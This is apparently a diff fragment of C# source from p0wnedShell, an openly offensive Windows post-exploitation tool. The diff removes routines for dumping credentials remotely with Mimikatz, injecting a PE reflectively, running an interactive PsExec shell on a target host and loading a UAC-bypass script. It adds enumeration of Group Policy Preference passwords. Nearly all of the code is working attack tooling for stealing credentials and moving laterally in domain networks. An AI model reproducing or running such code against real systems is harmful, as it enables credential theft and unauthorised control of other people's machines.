-            string input = Console.ReadLine();
-            switch (input.ToLower())
-            {
-                case "y":
-                    Console.Write("\n[+] Please enter the hostname of the machine you want to run your commands on (e.g. dc1.gotham.local) > ");
-                    Console.ForegroundColor = ConsoleColor.Green;
-                    Hostname = Console.ReadLine().TrimEnd('\r', '\n');
-                    Console.ResetColor();
-                    if (Hostname == "")
-                    {
-                        Console.ForegroundColor = ConsoleColor.Red;
-                        Console.WriteLine("\n[+] This is not a valid hostname, please try again\n");
-                        Console.ResetColor();
-                        Console.WriteLine("Press Enter to Continue...");
-                        Console.ReadLine();
-                        return;
-                    }
-                    break;
-                case "n":
-                    Console.ForegroundColor = ConsoleColor.Red;
-                    Console.WriteLine("\n[+] First try to elevate your permissions.\n");
-                    Console.ResetColor();
-                    Console.WriteLine("Press Enter to Continue...");
-                    Console.ReadLine();
-                    return;
-                default:
-                    Console.ForegroundColor = ConsoleColor.Red;
-                    Console.WriteLine("\n[+] Wrong choice, please try again!\n");
-                    Console.ResetColor();
-                    Console.WriteLine("Press Enter to Continue...");
-                    Console.ReadLine();
-                    return;
-            }
-            PsExecShell(Hostname);
-
-        }
-
-        public static void Remote_Mimikatz()
-        {
-            string[] toPrint = { "* Execute Mimikatz on a remote computer to dump credentials.        *" };
-            Program.PrintBanner(toPrint);
-
-            Console.WriteLine("\n[+] For this attack to succeed, you need to have Admin privileges.");
-            Console.Write("[+] Do you have the required permissions (e.g. Domain Admin)? (y/n) > ");
-            string Hostname = null;
-            string Creds = null;
-            string input = Console.ReadLine();
-            switch (input.ToLower())
-            {
-                case "y":
-                    Console.Write("\n[+] Please enter the fqdn hostname of the machine you want to dump the credentials (e.g. dc1.gotham.local) > ");
-                    Console.ForegroundColor = ConsoleColor.Green;
-                    Hostname = Console.ReadLine().TrimEnd('\r', '\n');
-                    Console.ResetColor();
-                    if (Hostname == "")
-                    {
-                        Console.ForegroundColor = ConsoleColor.Red;
-                        Console.WriteLine("\n[+] This is not a valid hostname, please try again\n");
-                        Console.ResetColor();
-                        Console.WriteLine("Press Enter to Continue...");
-                        Console.ReadLine();
-                        return;
-                    }
-                    break;
-                case "n":
-                    Console.ForegroundColor = ConsoleColor.Red;
-                    Console.WriteLine("\n[+] First try to elevate your permissions.\n");
-                    Console.ResetColor();
-                    Console.WriteLine("Press Enter to Continue...");
-                    Console.ReadLine();
-                    return;
-                default:
-                    Console.ForegroundColor = ConsoleColor.Red;
-                    Console.WriteLine("\n[+] Wrong choice, please try again!\n");
-                    Console.ResetColor();
-                    Console.WriteLine("Press Enter to Continue...");
-                    Console.ReadLine();
-                    return;
-            }
-
-            string Remote_Mimikatz = "Invoke-Mimikatz -DumpCreds -ComputerName \"" + Hostname + "\"";
+            string DomainJoined = String.Empty;
             try
             {
-                Creds = RunPSCommand(Remote_Mimikatz);
+                DomainJoined = Domain.GetComputerDomain().Name;
             }
-            catch (Exception e)
-            {
-                Console.WriteLine(e.Message);
-            }
-
-            if (Creds.Length <= 5)
+            catch
             {
                 Console.ForegroundColor = ConsoleColor.Red;
-                Console.WriteLine("\n[+] Oops something went wrong, maybe a wrong Hostname?\n");
-                Console.ResetColor();
-            }
-            else
-            {
-                Console.WriteLine(RunPSCommand(Remote_Mimikatz));
-            }
-            Console.WriteLine("Press Enter to Continue...");
-            Console.ReadLine();
-            return;
-        }
-
-        public static void ReactShell()
-        {
-            Console.Clear();
-            Console.Write("[+] Please wait until loaded...\n");
-            Console.WriteLine();
-
-            string React = "Invoke-ReflectivePEInjection -PEBytes (\"" + Binaries.ReactOS() + "\" -split ' ') -ForceASLR -FuncReturnType Void -Verbose";
-            try
-            {
-                P0wnedListener.Execute(React);
-            }
-            catch (Exception e)
-            {
-                Console.WriteLine(e.Message);
-            }
-        }
-
-        public static void PsExecShell(string Hostname)
-        {
-            string TestConnection = "Invoke-PsExec -ComputerName " + Hostname + " -Command \"whoami\" -ResultFile \"" + Program.P0wnedPath() + "\\Result.txt\"";
-            RunPSCommand(TestConnection);
-            if (!File.Exists(Program.P0wnedPath() + "\\Result.txt"))
-            {
-                Console.ForegroundColor = ConsoleColor.Red;
-                Console.WriteLine("\n[+] Cannot connect to server, probably insufficient permission or a firewall blocking our connection.\n");
+                Console.WriteLine("[+] Looks like our machine is not joined to a Windows Domain.\n");
                 Console.ResetColor();
                 Console.WriteLine("Press Enter to Continue...");
                 Console.ReadLine();
                 return;
             }
-            File.Delete(Program.P0wnedPath() + "\\Result.txt");
-            Console.WriteLine();
 
-            while (true)
+            Console.Write("[+] Please wait while enumerating Group Policy Preference settings...\n");
+
+            string GPPPassword = "Get-GPPPassword | more";
+            try
             {
-                int bufSize = 8192;
-                Stream inStream = Console.OpenStandardInput(bufSize);
-                Console.SetIn(new StreamReader(inStream, Console.InputEncoding, false, bufSize));
-
-                Console.Write("[system@" + Hostname + " ~]$ ");
-                string cmd = Console.ReadLine();
-                string PsExec = "Invoke-PsExec -ComputerName " + Hostname + " -Command \"" + cmd + "\" -ResultFile \"" + Program.P0wnedPath() + "\\Result.txt\"";
-                string Result = null;
-                if (cmd == "exit")
-                {
-                    return;
-                }
-                else if (cmd == "quit")
-                {
-                    return;
-                }
-                else
-                {
-                    try
-                    {
-                        RunPSCommand(PsExec);
-                    }
-                    catch (Exception e)
-                    {
-                        Console.WriteLine(e.Message);
-                    }
-                }
-                if (File.Exists(Program.P0wnedPath() + "\\Result.txt"))
-                {
-                    Result = System.IO.File.ReadAllText(Program.P0wnedPath() + "\\Result.txt");
-                    System.Console.WriteLine("{0}", Result);
-                    File.Delete(Program.P0wnedPath() + "\\Result.txt");
-                }
-                else
-                {
-                    Console.ForegroundColor = ConsoleColor.Red;
-                    Console.WriteLine("[+] Oops something went wrong, please try again!\n");
-                    Console.ResetColor();
-                    Console.WriteLine("Press Enter to Continue...");
-                    Console.ReadLine();
-                    return;
-                }
-
+                P0wnedListener.Execute(GPPPassword);
             }
+            catch (Exception e)
+            {
+                Console.WriteLine(e.Message);
+            }
+            Console.WriteLine("\nPress Enter to Continue...");
+            Console.ReadLine();
+            return;
         }
 
         //Based on Jared Atkinson's And Justin Warner's Work
@@ -1511,10 +869,6 @@ namespace p0wnedShell
             if (cmd.IndexOf("PowerCat", 0, StringComparison.OrdinalIgnoreCase) != -1)
             {
                 pipeline.Commands.AddScript(Resources.PowerCat());
-            }
-            if (cmd.IndexOf("Invoke-PsUACme", 0, StringComparison.OrdinalIgnoreCase) != -1)
-            {
-                pipeline.Commands.AddScript(Resources.Invoke_PsUACme());
             }
             if (cmd.IndexOf("Invoke-Encode", 0, StringComparison.OrdinalIgnoreCase) != -1)
             {
